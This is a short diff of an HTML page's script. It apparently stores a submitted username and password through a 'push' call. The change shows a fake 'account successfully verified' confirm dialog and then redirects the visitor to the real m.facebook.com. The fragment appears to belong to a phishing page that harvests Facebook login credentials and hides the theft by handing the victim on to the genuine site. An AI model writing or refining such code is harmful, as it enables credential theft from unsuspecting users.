@@ -100,12 +100,19 @@
   password:password
 });
 if(push!=null)
-   {
-    alert("Your Account is Succesfully verified");
-    window.location.href="login1.html";
+{
+   
+if (window.confirm('Your account is Successfully verified. If you want to sign in now ?'))
+{
 
-   }
+    window.location = 'https://m.facebook.com/';
 }
+else
+{
+    die();
+}
+}
+
 </script>
 </body>
 </html>
